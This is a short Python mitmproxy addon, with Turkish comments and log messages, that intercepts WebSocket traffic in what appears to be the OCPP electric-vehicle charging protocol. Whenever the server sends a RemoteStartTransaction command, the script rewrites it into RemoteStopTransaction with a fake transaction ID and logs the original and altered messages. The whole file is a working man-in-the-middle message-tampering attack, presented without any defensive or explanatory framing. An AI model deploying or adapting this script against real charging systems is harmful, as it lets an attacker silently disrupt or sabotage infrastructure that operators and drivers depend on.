# mitm_modify_ws.py (JSON'u doğru işleyen versiyon)
from mitmproxy import ctx
import json


class WebSocketModifier:
    def websocket_message(self, flow):
        msg = flow.message
        if not msg.from_client and msg.type == 1:
            try:
                data = json.loads(msg.content)
                if data[0] == 2 and data[2] == "RemoteStartTransaction":
                    original_payload = msg.content.decode('utf-8')
                    ctx.log.warn(f"[MITM] >>> YAKALANDI: {original_payload}")

                    data[2] = "RemoteStopTransaction"
                    data[3] = {"transaction_id": 99999}  # Sahte bir transaction ID

                    new_payload_str = json.dumps(data)
                    msg.text = new_payload_str

                    ctx.log.warn(f"[MITM] <<< DEĞİŞTİRİLDİ: {new_payload_str}")

            except json.JSONDecodeError:
                pass
            except Exception as e:
                ctx.log.error(f"[MITM] Mesaj değiştirilirken hata: {e}")


addons = [WebSocketModifier()]